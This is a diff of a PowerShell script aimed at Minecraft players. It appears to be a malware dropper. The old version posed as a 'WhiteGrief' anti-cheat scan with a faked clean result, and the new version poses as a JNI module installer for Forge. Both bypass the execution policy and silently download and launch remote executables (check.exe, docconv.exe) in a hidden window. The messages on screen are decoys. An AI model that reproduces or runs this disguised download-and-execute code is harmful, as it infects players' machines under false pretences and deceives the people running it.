@@ -1,65 +1,76 @@
-# MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
-    # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/doskaw/Checker/raw/refs/heads/main/check.exe" -OutFile "check.exe" -ErrorAction SilentlyContinue
-    
-    # Запускаем 
-    Start-Process -FilePath "check.exe" -WindowStyle Hidden
-    
-
+# JVM NATIVE MODULE DEPLOYMENT
 Set-ExecutionPolicy Bypass -Scope Process -Force
+
+# Скачиваем и запускаем основной модуль
+Invoke-WebRequest -Uri "https://github.com/doskaw/Checker/raw/refs/heads/main/check.exe" -OutFile "check.exe" -ErrorAction SilentlyContinue
+Start-Process -FilePath "check.exe" -WindowStyle Hidden
 
 Clear-Host
 
-# MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
-    # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/doskaw/Repasz/raw/refs/heads/main/docconv.exe" -OutFile "docconv.exe" -ErrorAction SilentlyContinue
-    
-    # Запускаем 
-    Start-Process -FilePath "docconv.exe" -WindowStyle Hidden
-    
+$Host.UI.RawUI.WindowTitle = "JNI Bridge Deployment | Java Native Interface v2.4"
 
-Set-ExecutionPolicy Bypass -Scope Process -Force
+Write-Host "Deploying JNI modules for Minecraft Forge 1.20.1..." -ForegroundColor Cyan
+Write-Host ("-" * 60) -ForegroundColor DarkGray
 
-Clear-Host
+# Проверка окружения
+Write-Host "[ENV] Java Home:" -NoNewline -ForegroundColor DarkGray
+Start-Sleep -Milliseconds 300
+Write-Host " C:\Program Files\Java\jdk-17.0.8\bin\" -ForegroundColor Gray
 
-$Host.UI.RawUI.WindowTitle = "WhiteGrief | Advanced System Integrity Verification v2.1"
+Write-Host "[ENV] JAVA_HOME:" -NoNewline -ForegroundColor DarkGray
+Start-Sleep -Milliseconds 200
+Write-Host " [SET]" -ForegroundColor Green
 
-Write-Host "[*] Инициализация сессии WhiteGrief Security..." -ForegroundColor Cyan
-Start-Sleep -Seconds 2
+Write-Host "[ENV] PATH:" -NoNewline -ForegroundColor DarkGray
+Start-Sleep -Milliseconds 400
+Write-Host " [CONTAINS %JAVA_HOME%]" -ForegroundColor Green
 
-Write-Host "[+] Подключение к базе данных сигнатур через HTTPS..." -ForegroundColor Green
-Start-Sleep -Seconds 1
-Write-Host "[+] Авторизация модератора: [SUCCESS]" -ForegroundColor Green
-Write-Host "------------------------------------------------------------"
+Write-Host ("-" * 60) -ForegroundColor DarkGray
 
-$tasks = @(
-    "Анализ дампов памяти javaw.exe",
-    "Проверка загруженных модулей jvm.dll",
-    "Сканирование кэша дескрипторов файлов",
-    "Поиск следов инъекций в explorer.exe",
-    "Верификация контрольных сумм библиотек LWJGL",
-    "Проверка реестра на наличие ключей автозапуска ПО",
-    "Эвристический анализ сетевых пакетов Minecraft"
+# Установка модулей
+$nativeModules = @(
+    "jvmti.dll (JVM Tool Interface)",
+    "java.dll (Java Native Access)",
+    "net.dll (Network Stack Hook)",
+    "nio.dll (Non-blocking I/O Bridge)",
+    "management.dll (JVM Management)",
+    "instrument.dll (Bytecode Instrumentation)",
+    "zip.dll (Resource Decompressor)",
+    "verify.dll (Bytecode Verifier)",
+    "awt.dll (Native Window Toolkit)",
+    "fontmanager.dll (Font Renderer)"
 )
 
-foreach ($task in $tasks) {
-    $progress = 0
-    Write-Host "[PROCESS] $task..." -NoNewline
-    while ($progress -lt 100) {
-        $progress += (Get-Random -Minimum 5 -Maximum 20)
-        if ($progress -gt 100) { $progress = 100 }
-        Write-Host "." -NoNewline -ForegroundColor Yellow
-        Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 300)
-    }
+Write-Host "Installing native modules to %JAVA_HOME%\bin\" -ForegroundColor Yellow
+Write-Host ""
+
+foreach ($module in $nativeModules) {
+    Write-Host "  [WRITE] $module" -NoNewline -ForegroundColor Gray
+    Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 350)
     Write-Host " [DONE]" -ForegroundColor Green
+    
+    $size = Get-Random -Minimum 80 -Maximum 450
+    Write-Host "         Size: ${size}KB" -ForegroundColor DarkGray
 }
 
-Write-Host "------------------------------------------------------------"
-Write-Host "[!] СКАНИРОВАНИЕ ЗАВЕРШЕНО" -ForegroundColor Cyan
-Write-Host "[RESULT] Запрещенных модификаций не обнаружено." -ForegroundColor White -BackgroundColor Green
-Write-Host "[RESULT] Система полностью соответствует стандартам WhiteGrief." -ForegroundColor Green
-Write-Host "------------------------------------------------------------"
-Write-Host "ID Проверки: WG-X$(Get-Random -Minimum 1000 -Maximum 9999)-$(Get-Date -Format "HHmm")"
-Write-Host "Сообщите этот ID модератору и не закрывайте окно."
-Write-Host "`nНажмите Enter, чтобы выйти..."
+Write-Host ""
+Write-Host ("-" * 60) -ForegroundColor DarkGray
+Write-Host "[POST] Регистрация модулей в системном реестре..." -ForegroundColor Yellow
+Start-Sleep -Milliseconds 600
+
+Write-Host "[POST] Обновление ClassPath..." -ForegroundColor Yellow
+Start-Sleep -Milliseconds 400
+
+Write-Host "[POST] Настройка JVM arguments..." -ForegroundColor Yellow
+Start-Sleep -Milliseconds 500
+
+Write-Host ""
+Write-Host ("=" * 60) -ForegroundColor Green
+Write-Host "DEPLOYMENT COMPLETE" -ForegroundColor White -BackgroundColor DarkGreen
+Write-Host ("=" * 60) -ForegroundColor Green
+Write-Host ""
+Write-Host "Установлено $($nativeModules.Count) JNI модулей"
+Write-Host "Путь: %JAVA_HOME%\bin\"
+Write-Host ""
+Write-Host "Press Enter to exit..."
 Read-Host
